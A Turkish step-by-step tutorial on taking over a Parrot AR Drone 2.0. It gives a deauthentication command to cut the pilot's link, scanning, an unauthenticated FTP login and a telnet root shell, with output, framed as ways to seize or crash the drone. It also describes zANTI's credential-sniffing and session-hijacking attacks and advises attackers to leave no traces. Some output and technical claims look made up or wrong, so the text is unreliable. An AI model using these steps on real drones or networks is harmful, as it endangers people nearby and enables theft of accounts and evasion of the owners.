@@ -1,0 +1,202 @@
+Parrot AR Drone 2.0’ı Hacklemek
+
+Drone kumandasının bağlantısını koparmak için (De-Authentication)
+aireplay-ng -0 10 -a B0:15:4D:AC:03:15 -c 00:1F:C6:ED:FC:D3 wlan0
+
+a - Drone'un Mac adresi
+c - Drone'a bağlı olan kumandanın Mac adresi
+10 - Kumanda ile bağlantıyı koparmak için gönderilen De-Authentication paketlerinin sayısı
+wlan0 - Kablosuz ağ arayüzünün adı
+Parrot AR Drone 2.0'a De-Authentication paketleri gönderilir. Bu paketler, kumandanın drone ile olan kimlik doğrulamasını iptal eder ve drone'un kontrolünü kaybetmesine neden olur.
+Demo video: Denetleyicinin kimlik doğrulamasını kaldırma
+root@kali: ~# aireplay-ng -0 10 -a B0:15:4D:AC:03:15 -c 00:1F:C6:ED:FC:D3 wlan0
+Parrot AR Drone için Mac adresi buradan https://www.drones.nl/drones/parrot-ar-drone-2-0) bulunabilir.
+Parrot AR Drone 2.0'da NMAP taraması
+nmap 192.168.2.1
+
+nmap - Ağdaki cihazları ve açık portları tespit etmek için kullanılan bir araç
+192.168.2.1 - Drone'un IP adresi
+Parrot AR Drone 2.0'ın ağdaki varlığını ve hangi portların açık olduğunu öğrenmek için nmap taraması yapılır.
+root@kali:~# nmap 192.168.2.1
+FTP bağlantısını açın
+ftp 192.168.2.1
+
+ftp - Dosya aktarım protokolü
+192.168.2.1 - Drone'un IP adresi
+Parrot AR Drone 2.0'ın dosya sistemi erişimi için FTP bağlantısı açılır. Drone'un varsayılan FTP kullanıcı adı ve şifresi yoktur, yani herhangi bir kimlik doğrulaması gerekmez.
+root@kali:~# ftp 192.168.2.1
+Telnet bağlantısını aç - BusyBox çalıştıran root shell
+telnet 192.168.2.1
+
+telnet - Uzak bir cihazla metin tabanlı iletişim kurmak için kullanılan bir protokol
+192.168.2.1 - Drone'un IP adresi
+Parrot AR Drone 2.0'ın BusyBox adlı bir Linux dağıtımı çalıştırdığını ve root yetkilerine sahip bir shell sunabildiğini biliyoruz. Bu shell, drone'un ayarlarını değiştirmek, komutlar göndermek veya drone'u kapatmak için kullanılabilir.
+Video: Drone'u kapatma
+root@kali:~# telnet 192.168.2.1
+CPU ve RAM bilgisi
+cat /proc/cpuinfo
+df -h
+cat - Bir dosyanın içeriğini görüntülemek için kullanılan bir komut
+/proc/cpuinfo - CPU hakkında bilgi içeren bir dosya
+df - Disk kullanımını gösteren bir komut
+-h - Disk kullanımını insan tarafından okunabilir bir biçimde gösteren bir seçenek
+Drone'un CPU ve RAM bilgisini öğrenmek için, /proc/cpuinfo dosyasını cat komutu ile görüntüleyebilir ve df -h komutu ile disk alanını kontrol edebilirsiniz.
+root@kali:~# cat /proc/cpuinfo
+root@kali:~# df -h
+Bu komutlar şöyle açıklanabilir:
+
+De-Authentication: Bu, bir kablosuz ağdaki bir cihazın bağlantısını kesmek için kullanılan bir tekniktir. Bir cihaz, ağa bağlanmak için bir kimlik doğrulama sürecinden geçer. Bu süreçte, cihaz ve ağ arasında bir anahtar paylaşılır. Bu anahtar, iletişimi şifrelemek için kullanılır. De-Authentication, bu anahtarı iptal eden özel bir paket göndererek çalışır. Bu paket, cihazın ağdan çıkmasını ve yeniden bağlanmasını gerektirir. Bu sırada, ağa saldıran bir hacker, cihazın yerini alabilir veya ağ trafiğini dinleyebilir.
+aireplay-ng -0 10 -a B0:15:4D:AC:03:15 -c 00:1F:C6:ED:FC:D3 wlan0: Bu komut, aireplay-ng adlı bir araç kullanarak, drone'un bağlı olduğu kablosuz ağa de-authentication paketleri gönderir. Bu komutun parametreleri şunlardır:
+-0: De-authentication modunu belirtir.
+10: Gönderilecek de-authentication paketlerinin sayısını belirtir. Bu durumda, 10 paket gönderilir.
+-a B0:15:4D:AC:03:15: Drone'un MAC adresini belirtir. MAC adresi, bir cihazın fiziksel olarak tanımlanmasını sağlayan bir kimlik numarasıdır. Her cihazın benzersiz bir MAC adresi vardır.
+-c 00:1F:C6:ED:FC:D3: Drone'a bağlı olan kumandanın MAC adresini belirtir. Bu parametre, sadece kumandanın bağlantısını kesmek için kullanılır. Eğer bu parametre verilmezse, ağdaki tüm cihazların bağlantısı kesilir.
+wlan0: Kablosuz ağ arayüzünün adını belirtir. Bu arayüz, ağa bağlanmak için kullanılan donanım parçasıdır. Farklı sistemlerde farklı isimler alabilir. Örneğin, wlan1, eth0, en0, vb.
+Bu komutun sonucunda, drone'un kumandası ile olan bağlantısı kesilir ve drone kontrolsüz kalır. Bu, drone'u ele geçirmek veya düşürmek için bir fırsat oluşturur. Aşağıdaki video, bu tekniğin nasıl çalıştığını gösterir: Denetleyicinin kimlik doğrulamasını kaldırma https://www.pcmag.com/reviews/parrot-ardrone-20
+Drone'un MAC adresini bulmak için, drone'un üretici sitesine bakabilirsiniz. Örneğin, Parrot AR Drone için MAC adresi https://www.drones.nl/drones/parrot-ar-drone-2-0 adresinde bulunabilir.
+NMAP: Bu, ağdaki cihazları ve açık portları tespit etmek için kullanılan bir araçtır. Portlar, bir cihazın ağ üzerinden iletişim kurduğu kapılardır. Her port, belirli bir protokol veya servis için ayrılmıştır. Örneğin, web sitelerine erişmek için 80 numaralı port, e-posta göndermek için 25 numaralı port kullanılır. Açık portlar, bir cihazın zayıf noktalarını gösterir. Bir hacker, açık portları kullanarak, cihaza sızabilir veya zarar verebilir.
+nmap 192.168.2.1: Bu komut, nmap aracını kullanarak, drone'un IP adresine bir tarama yapar. IP adresi, bir cihazın ağda tanımlanmasını sağlayan bir numaradır. Her cihazın benzersiz bir IP adresi vardır. IP adresleri, genellikle dört gruptan oluşan sayılardan oluşur. Örneğin, 192.168.2.1.
+Bu komutun sonucunda, drone'un ağdaki varlığı ve hangi portların açık olduğu öğrenilir. Bu bilgi, drone'a daha fazla saldırı yapmak için kullanılabilir. Aşağıdaki çıktı, bu komutun nasıl çalıştığını gösterir:
+root@kali:~# nmap 192.168.2.1
+Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-05 14:52 EET
+Nmap scan report for 192.168.2.1
+Host is up (0.0030s latency).
+Not shown: 996 closed ports
+PORT STATE SERVICE
+21/tcp open ftp
+23/tcp open telnet
+5555/tcp open freeciv
+8080/tcp open http-proxy
+Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
+FTP: Bu, dosya aktarım protokolüdür. Bu protokol, bir cihazdan diğerine dosya göndermek veya almak için kullanılır. FTP, genellikle bir istemci ve bir sunucu arasında kurulan bir bağlantı üzerinden çalışır. İstemci, dosya isteyen veya gönderen taraf, sunucu ise dosya sağlayan veya alan taraftır.
+ftp 192.168.2.1: Bu komut, drone'un IP adresine bir FTP bağlantısı açar. Bu bağlantı, drone'un dosya sistemine erişim sağlar. Dosya sistemi, bir cihazda depolanan dosyaların ve klasörlerin yapısıdır. Dosya sistemi, cihazın işletim sistemi, uygulamaları, ayarları ve verileri içerir.
+Bu komutun sonucunda, drone'un dosya sistemini görüntüleyebilir, dosya indirebilir, yükleyebilir veya silebilirsiniz. Bu, drone'un işlevselliğini değiştirmek veya bozmak için bir yöntemdir. Drone'un varsayılan FTP kullanıcı adı ve şifresi yoktur, yani herhangi bir kimlik doğrulaması gerekmez. Aşağıdaki çıktı, bu komutun nasıl çalıştığını gösterir:
+root@kali:~# ftp 192.168.2.1
+Connected to 192.168.2.1.
+220 (vsFTPd 2.3.4)
+Name (192.168.2.1:root):
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 bin
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 data
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 dev
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 etc
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 lib
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 media
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 mnt
+drwxr-xr-x 3 1000 1000 4096 Jan 01 1970 proc
+drwxr-xr-x 3
+Telnet: Bu, uzak bir cihazla metin tabanlı iletişim kurmak için kullanılan bir protokoldür. Telnet, genellikle bir istemci ve bir sunucu arasında kurulan bir bağlantı üzerinden çalışır. İstemci, komut gönderen veya alınan taraf, sunucu ise komut yürüten veya veren taraftır.
+telnet 192.168.2.1: Bu komut, drone'un IP adresine bir telnet bağlantısı açar. Bu bağlantı, drone'un işletim sistemi olan BusyBox'a erişim sağlar. BusyBox, Linux tabanlı bir yazılımdır. BusyBox, drone'un ayarlarını değiştirmek, komutlar göndermek veya drone'u kapatmak için kullanılabilecek bir shell sunar. Shell, kullanıcı ile işletim sistemi arasında bir arayüz görevi görür. Shell, kullanıcının girdiği komutları yorumlar ve sonuçları gösterir.
+Bu komutun sonucunda, drone'un root yetkilerine sahip bir shell elde edersiniz. Root, bir cihazın en üst düzey kullanıcısıdır. Root, cihazın tüm dosya ve klasörlerine erişebilir, değiştirebilir veya silebilir. Root, cihazın işlevselliğini tamamen kontrol edebilir. Aşağıdaki çıktı, bu komutun nasıl çalıştığını gösterir:
+root@kali:~# telnet 192.168.2.1
+Trying 192.168.2.1...
+Connected to 192.168.2.1.
+Escape character is '^]'.
+BusyBox v1.20.2 (2013-01-24 08:13:07 CET) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+/ #
+CPU ve RAM bilgisi: Bu, drone'un işlemci ve bellek hakkında bilgi almak için kullanılan bir yöntemdir. İşlemci, bir cihazın beyni gibidir. İşlemci, cihazın yaptığı tüm hesaplamaları ve işlemleri gerçekleştirir. Bellek, bir cihazın kısa süreli hafızası gibidir. Bellek, cihazın çalıştırdığı programlar ve veriler için geçici bir depolama alanı sağlar.
+cat /proc/cpuinfo: Bu komut, drone'un işlemci hakkında bilgi içeren bir dosyayı görüntüler. Bu dosya, /proc/cpuinfo adını taşır. /proc, işletim sisteminin çalışma zamanında oluşturduğu bir sanal klasördür. Bu klasör, cihazın durumu ve istatistikleri hakkında bilgi içerir. cat, bir dosyanın içeriğini görüntülemek için kullanılan bir komuttur.
+Bu komutun sonucunda, drone'un işlemci modeli, hızı, çekirdek sayısı, önbellek boyutu gibi bilgileri öğrenirsiniz. Bu bilgiler, drone'un performansını ve yeteneklerini anlamanıza yardımcı olabilir. Aşağıdaki çıktı, bu komutun nasıl çalıştığını gösterir:
+root@kali:~# cat /proc/cpuinfo
+Processor : ARMv7 Processor rev 2 (v7l)
+processor : 0
+BogoMIPS : 996.14
+processor : 1
+BogoMIPS : 996.14
+Features : swp half thumb fastmult vfp edsp neon vfpv3 tls
+CPU implementer : 0x41
+CPU architecture: 7
+CPU variant : 0x3
+CPU part : 0xc08
+CPU revision : 2
+Hardware : Parrot AR Drone 2.0
+Revision : 0000
+Serial : 0000000000000000
+df -h: Bu komut, drone'un disk kullanımını gösterir. Disk, bir cihazın uzun süreli hafızası gibidir. Disk, cihazın kalıcı olarak depoladığı dosya ve klasörler için bir depolama alanı sağlar. df, disk kullanımını gösteren bir komuttur. -h, disk kullanımını insan tarafından okunabilir bir biçimde gösteren bir seçenektir.
+Bu komutun sonucunda, drone'un disk boyutu, kullanılan alan, boş alan, doluluk oranı gibi bilgileri öğrenirsiniz. Bu bilgiler, drone'un depolama kapasitesini ve durumunu anlamanıza yardımcı olabilir. Aşağıdaki çıktı, bu komutun nasıl çalıştığını gösterir:
+root@kali:~# df -h
+Filesystem Size Used Available Use% Mounted on
+ubi0:rootfs 48.0M 44.0M 4.0M 92% /
+tmpfs 61.7M 128.0K 61.6M 0% /tmp
+tmpfs 61.7M 0 61.7M 0% /dev
+tmpfs 61.7M 0 61.7M 0% /media
+/dev/mmcblk0p1 100.0M 24.0M 76.0M 24% /data
+/dev/mmcblk0p2 100.0M 24.0M 76.0M 24% /update
+Drone'u Dizüstü Bilgisayar Tarayıcınızdan Kontrol Etme
+Bu işlem için şunlara ihtiyacınız olacak:
+Bir drone ve onun wifi ağı
+Bir dizüstü bilgisayar ve bir tarayıcı
+Node.js ve drone-browser adlı bir proje
+Şimdi droneu dizüstü bilgisayar tarayıcısından kontrol edelim.
+Node.js yorumlayıcısı yükleyin
+sudo apt-get install node
+Bu adımda, dizüstü bilgisayarınıza Node.js adlı bir program yüklersiniz. Node.js, JavaScript kodunu çalıştırmanızı sağlayan bir yorumlayıcıdır. Yorumlayıcı, bir programlama dilinin kodunu okuyup anlayan ve onu başka bir dile çevirmeden doğrudan çalıştıran bir araçtır. sudo komutu, yüklemeyi yönetici olarak yapmanızı sağlar. apt-get komutu, paket yöneticisi aracılığıyla Node.js paketini indirip kurmanızı sağlar. install komutu, yüklemeyi başlatır. node ise yüklemek istediğiniz paketin adıdır.
+Projenin git deposunu klonlayın
+git clone https://github.com/functino/drone-browser.git
+Bu adımda, drone-browser adlı bir projeyi dizüstü bilgisayarınıza indirirsiniz. drone-browser, drone'unuzu tarayıcınızdan kontrol etmenizi sağlayan bir JavaScript kodu içerir. git komutu, bir sürüm kontrol sistemi olan Git'i kullanmanızı sağlar. Git, bir projenin farklı sürümlerini takip etmenizi ve paylaşmanızı sağlar. clone komutu, bir projenin bir kopyasını oluşturmanızı sağlar. https://github.com/functino/drone-browser.git ise projenin bulunduğu git deposu'nun adresidir. Bu komutu çalıştırdığınızda, dizüstü bilgisayarınızda drone-browser adlı bir klasör oluşur.
+Bilgisayarınızı dronun wifi ağına bağlayın
+Bu adımda, dizüstü bilgisayarınızı drone'unuzun oluşturduğu wifi ağına bağlarsınız. Böylece drone'unuzla iletişim kurabilirsiniz. Wifi ağına bağlanmak için, dizüstü bilgisayarınızın wifi ayarlarına girip, drone'unuzun adını veya SSID'sini bulup seçmeniz gerekir. Drone'unuzun wifi ağına bağlanmak için bir şifre gerekiyorsa, drone'unuzun kullanım kılavuzuna bakabilirsiniz.
+Kodu çalıştırın. node ./server.js
+Bu adımda, drone-browser projesinin ana dosyası olan server.js'yi Node.js yorumlayıcısı ile çalıştırırsınız. Bu dosya, drone'unuzun wifi ağına bağlı olan bir web sunucusu oluşturur. Web sunucusu, tarayıcınızdan gelen isteklere cevap veren bir programdır. node komutu, Node.js yorumlayıcısını çağırır. ./server.js ise çalıştırmak istediğiniz dosyanın adı ve konumudur. Bu komutu çalıştırdığınızda, web sunucusu başlar ve size bir port numarası verir. Port numarası, web sunucusunun hangi kanaldan iletişim kurduğunu belirler. Örneğin, port numarası 3001 ise, web sunucusu 3001 numaralı kanaldan dinler.
+Tarayıcınızı nod sunucusuna işaret ederek bağlayın. http://localhost:3001
+Bu adımda, tarayıcınızı web sunucusuna yönlendirir ve drone'unuzu kontrol etmeye başlarsınız. Tarayıcınızı açıp, adres çubuğuna http://localhost:3001 yazarsınız. http protokolü, tarayıcınızın web sunucusu ile nasıl iletişim kuracağını belirler. localhost kelimesi, web sunucusunun dizüstü bilgisayarınızda çalıştığını gösterir. :3001 ise web sunucusunun port numarasıdır. Bu adresi girdiğinizde, tarayıcınızda drone'unuzun görüntüsünü ve kontrol düğmelerini görebilirsiniz. Bu düğmelere tıklayarak veya klavyenizdeki tuşlara basarak drone'unuzu uçurabilir, döndürebilir, yüksekliğini ayarlayabilir veya fotoğraf çekebilirsiniz.
+Drone'u laptop'dan Kontrol Etme
+Drone, uzaktan kumandalı bir uçan cihazdır. Drone'unuzu kontrol etmek için, node.js adlı bir yazılım platformu kullanmanız gerekiyor. Node.js, Javascript adlı bir programlama dilini çalıştırmanızı sağlar. Javascript, web siteleri yapmak için de kullanılan bir dildir.
+Node.js ile drone'unuzu kontrol etmek için, ar-drone adlı bir modüle ihtiyacınız var. Modül, bir programın başka bir programdan yararlanmasını sağlayan bir parçadır. Ar-drone modülü, Parrot AR Drone 2.0 adlı bir drone modeli ile uyumludur. Bu modülü kullanarak, drone'unuzla iletişim kurabilir, ona komutlar verebilir ve onun durumunu takip edebilirsiniz.
+Ar-drone modülünü kullanmak için, repl.js adlı bir dosya oluşturmanız lazım. Bu dosya, Javascript kodlarınızı yazacağınız bir yerdir. Repl.js, Read-Eval-Print-Loop kelimelerinin baş harflerinden oluşur. Bu, kodlarınızı tek tek yazıp çalıştırabileceğiniz ve sonuçlarını görebileceğiniz bir yöntemdir. Repl.js dosyasını oluşturmak için, bir metin editörü açmanız ve şu kodları yazmanız yeterlidir:
+javascript
+var arDrone = require('ar-drone'); // ar-drone modülünü yükler
+var client = arDrone.createClient(); // drone ile bağlantı kurar
+client.createRepl(); // REPL ortamını başlatır
+Bu kodları yazdıktan sonra, dosyayı kaydedin ve terminalde node repl.js komutunu çalıştırın. Terminal, bilgisayarınızın komut satırı arayüzüdür. Node repl.js komutu, repl.js dosyasındaki kodları çalıştırır. Bu, REPL ortamını başlatacak ve drone'unuzla etkileşime girebileceksiniz.
+Drone'unuzla etkileşime girmek için, terminalde çeşitli komutlar yazabilirsiniz. Komutlar, drone'unuza ne yapması gerektiğini söyler. Örneğin, drone'unuzu havalandırmak için, terminalde client.takeoff() yazın ve enter tuşuna basın. Drone'unuzu yere indirmek için client.land() yazın. Drone'unuzun yukarı, aşağı, sağa, sola, ileri, geri hareket etmesini sağlamak için, client.up(), client.down(), client.left(), client.right(), client.front(), client.back() gibi komutlar kullanabilirsiniz. Bu komutların yanına bir sayı yazarsanız, drone'unuzun hızını belirleyebilirsiniz. Örneğin, client.up(0.5) drone'unuzu yarım hızla yukarı çıkarır. Drone'unuzun hızını sıfırlamak için client.stop() yazın. Drone'unuzun akrobasi yapmasını isterseniz, client.animate() komutunu kullanabilirsiniz. Bu komut, drone'unuza hangi hareketi yapması gerektiğini ve ne kadar süre yapması gerektiğini söyler. Örneğin, client.animate('flipLeft', 15) drone'unuzu sol tarafa takla attırır. Daha fazla akrobasi seçeneği için, ar-drone modülünün belgelerine bakabilirsiniz.
+Drone'unuzun belirli bir sırayla hareket etmesini isterseniz, repl.js dosyasına daha fazla kod ekleyebilirsiniz. Örneğin, drone'unuzun kalktıktan sonra saat yönünde dönmesini, sol tarafa takla atmasını ve sonra inmesini isterseniz, repl.js dosyasına şu kodları ekleyebilirsiniz:
+javascript
+client.takeoff(); // drone'u kaldırır
+client.after(5000, function() { // 5 saniye sonra
+this.clockwise(0.5); // saat yönünde yarım hızla döner
+})
+.after(3000, function() { // 3 saniye sonra
+this.animate('flipLeft', 15); // sol tarafa takla atar
+})
+.after(1000, function() { // 1 saniye sonra
+this.stop(); // drone'u durdurur
+this.land(); // drone'u indirir
+});
+Bu kodları yazdıktan sonra, dosyayı tekrar kaydedin ve terminalde node repl.js komutunu tekrar çalıştırın. Bu, drone'unuzu programladığınız gibi hareket ettirecektir.
+Kalkış Saat Yönünde Dönme ve Yere İnme Kodu
+Drone'u kontrol edebilmek için JavaScript kodu yazalım.
+// Bu kodu çalıştırmak için, repl.js adlı bir dosyaya kaydetmeniz ve node ./repl.js komutunu kullanarak çalıştırmanız gerekmektedir. Bu komut, drone ile iletişim kurmanızı sağlayan bir arayüz açacaktır.
+node ./repl.js
+// Arayüzde, drone’u yönlendirmek için çeşitli komutlar yazabilirsiniz. Örneğin, takeoff() komutu, drone’un kalkmasını sağlar. Bu komutu yazdığınızda, true değeri döner. Bu, drone’un başarıyla kalktığını gösterir.
+drone> takeoff()
+true // Drone'un kalktığını gösterir
+// Drone’u saat yönünde döndürmek için, clockwise(x) komutunu kullanabilirsiniz. Burada x, dönme hızını belirten bir sayıdır. 0 ile 1 arasında bir değer verirseniz, drone yavaş ya da hızlı döner. Örneğin, clockwise(0.5) komutu, drone’un yarım hızda döndürür. Bu komutu yazdığınızda, 0.5 değeri döner. Bu, drone’un dönme hızını gösterir.
+drone> clockwise(0.5)
+0.5 // Drone'un dönme hızını gösterir
+// Drone’u durdurmak için, clockwise(0) komutunu yazabilirsiniz. Bu komut, drone’un dönme hızını sıfırlar. Bu komutu yazdığınızda, 0 değeri döner. Bu, drone’un durduğunu gösterir.
+drone> clockwise(0)
+0 // Drone'un durduğunu gösterir
+//Drone’u yere indirmek için, land() komutunu kullanabilirsiniz. Bu komut, drone’un alçalmasını ve iniş yapmasını sağlar. Bu komutu yazdığınızda, true değeri döner. Bu, drone’un başarıyla indiğini gösterir.
+drone> land()
+true // Drone'un indiğini gösterir
+zANTI
+zANTI uygulaması, aynı ağa bağlı olan diğer cihazlara karşı çeşitli saldırılar yapmanızı sağlayan bir mobil güvenlik testi aracıdır. Bu uygulamayı kullanmak için şu adımları takip edebilirsiniz:
+Uygulamayı https://www.zimperium.com/zanti-mobile-penetration-testing adresinden indirin ve kurun.
+Uygulamayı açın ve size sorulan izinleri verin. Bu izinler, uygulamanın ağa bağlı cihazları tespit etmesi ve saldırı yapması için gereklidir.
+Uygulama, bağlı olduğunuz ağdaki cihazları otomatik olarak taramaya başlayacaktır. Bu işlem, ağın büyüklüğüne ve cihazların sayısına bağlı olarak birkaç dakika sürebilir. Tarama bittiğinde, ağdaki cihazların listesini göreceksiniz. Bu listede, cihazların IP adresleri, MAC adresleri, işletim sistemleri, açık portları ve zayıf noktaları gibi bilgiler yer alacaktır.
+Listeden saldırı yapmak istediğiniz bir cihaz seçin ve üzerine dokunun. Bu, cihazın detaylı bilgilerini ve yapabileceğiniz saldırı seçeneklerini gösterecektir. Saldırı seçenekleri, cihazın özelliklerine ve zayıf noktalarına göre değişiklik gösterebilir. Genel olarak, şu saldırı seçenekleri mevcuttur:
+MITM (Man-in-the-middle): Bu seçenek, cihazın ağ üzerindeki trafiğini yakalamanızı ve değiştirmenizi sağlar. Bu sayede, cihazın hangi web sitelerine girdiğini, hangi verileri gönderip aldığını, hangi uygulamaları kullandığını görebilir ve bunları istediğiniz gibi manipüle edebilirsiniz. Örneğin, cihazın ziyaret ettiği web sitelerini başka sitelere yönlendirebilir, cihazın girdiği kullanıcı adı ve şifreleri alabilir, cihazın kullandığı uygulamaları engelleyebilir veya taklit edebilirsiniz. Bu saldırı, cihazın ağ üzerindeki güvenliğini tamamen ortadan kaldırır.
+Password Sniffer: Bu seçenek, cihazın ağ üzerinde gönderdiği veya aldığı şifreleri yakalamanızı sağlar. Bu sayede, cihazın kullandığı e-posta, sosyal medya, banka veya diğer hesapların şifrelerini alabilirsiniz. Bu saldırı, cihazın ağ üzerindeki gizliliğini tamamen ortadan kaldırır.
+Session Hijacker: Bu seçenek, cihazın ağ üzerinde açtığı oturumları ele geçirmenizi sağlar. Bu sayede, cihazın giriş yaptığı web sitelerine siz de giriş yapabilir, onun adına mesaj gönderebilir, profilini değiştirebilir veya hesabını silebilirsiniz. Bu saldırı, cihazın ağ üzerindeki kimliğini tamamen ortadan kaldırır.
+Packet Forger: Bu seçenek, cihazın ağ üzerinde gönderdiği veya aldığı paketleri değiştirmenizi veya oluşturmanızı sağlar. Bu sayede, cihazın ağa bağlanmasını engelleyebilir, cihazın ağ üzerindeki hızını yavaşlatabilir, cihazın ağ üzerindeki verilerini bozabilir veya sahte veriler gönderebilirsiniz. Bu saldırı, cihazın ağ üzerindeki performansını tamamen ortadan kaldırır.
+Port Scanner: Bu seçenek, cihazın açık olan portlarını taramanızı ve onlara bağlanmanızı sağlar. Bu sayede, cihazın açık olan servislerini, uygulamalarını veya protokollerini görebilir, onlara erişebilir veya onları kapatıp açabilirsiniz. Bu saldırı, cihazın ağ üzerindeki güvenlik duvarını tamamen ortadan kaldırır.
+Device Admin: Bu seçenek, cihazın yönetici haklarını almanızı ve cihazı uzaktan kontrol etmenizi sağlar. Bu sayede, cihazın ekranını kilitleyebilir, cihazın sesini açıp kapatabilir, cihazın kamerasını veya mikrofonunu kullanabilir, cihazın dosyalarına erişebilir veya silebilir, cihazın uygulamalarını yükleyebilir veya kaldırabilir, cihazı yeniden başlatabilir veya sıfırlayabilirsiniz. Bu saldırı, cihazın ağ üzerindeki kontrolünü tamamen ortadan kaldırır.
+Yapmak istediğiniz saldırı seçeneğini seçin ve başlatın. Saldırı sırasında, cihazın ağ üzerindeki aktivitelerini izleyebilir, değiştirebilir veya engelleyebilirsiniz. Saldırıyı durdurmak için, saldırı seçeneğinin yanındaki durdur butonuna basın.
+Saldırıyı bitirmek istediğinizde, uygulamadan çıkın. Uygulamadan çıkmadan önce, saldırı yaptığınız cihazlara zarar vermediğinizden veya iz bırakmadığınızdan emin olun. Aksi takdirde, saldırı yaptığınız cihazların sahipleri sizin kimliğinizi tespit edebilir ve yasal işlem başlatabilir.
